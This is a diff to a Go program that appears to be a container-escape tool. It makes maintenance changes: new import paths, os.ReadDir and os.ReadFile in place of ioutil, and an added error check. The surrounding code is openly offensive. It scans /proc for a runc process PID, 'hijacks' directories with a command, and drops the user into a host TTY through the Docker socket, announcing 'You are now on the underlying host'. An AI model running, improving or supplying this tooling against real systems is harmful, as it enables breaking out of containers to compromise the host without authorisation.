@@ -9,7 +9,6 @@ import (
 	"crypto/tls"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"math/rand"
 	"net"
@@ -29,7 +28,7 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/s3"
 	"github.com/creack/pty"
 	"github.com/tv42/httpunix"
-	"golang.org/x/crypto/ssh/terminal"
+	"golang.org/x/term"
 )
 
 func fileExists(filename string) bool {
@@ -53,6 +52,9 @@ func httpRequestBearer(url, token string) (int, error) {
 	var bearer = "Bearer " + token
 
 	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return 0, err
+	}
 	req.Header.Add("Authorization", bearer)
 
 	timeout := time.Duration(2 * time.Second)
@@ -299,13 +301,13 @@ func queryEndpoint(url string) bool {
 func processCmdLine() {
 	var found int
 	for found == 0 {
-		pids, err := ioutil.ReadDir("/proc")
+		pids, err := os.ReadDir("/proc")
 		if err != nil {
 			fmt.Println(err)
 			return
 		}
 		for _, f := range pids {
-			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
+			fbytes, _ := os.ReadFile("/proc/" + f.Name() + "/cmdline")
 			fstring := string(fbytes)
 			if strings.Contains(fstring, "runc") {
 				fmt.Println("[+] Found the PID:", f.Name())
@@ -372,7 +374,7 @@ func createFile(filename, data string) error {
 
 func hijackDirectory(dir, command string) {
 	fmt.Println("[+] Currently hijacking: ", dir)
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -530,11 +532,11 @@ func dropToTTY(dockerSockPath string) error {
 	}()
 
 	// Set stdin in raw mode.
-	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
 		panic(err)
 	}
-	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
 
 	go func() {
 		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
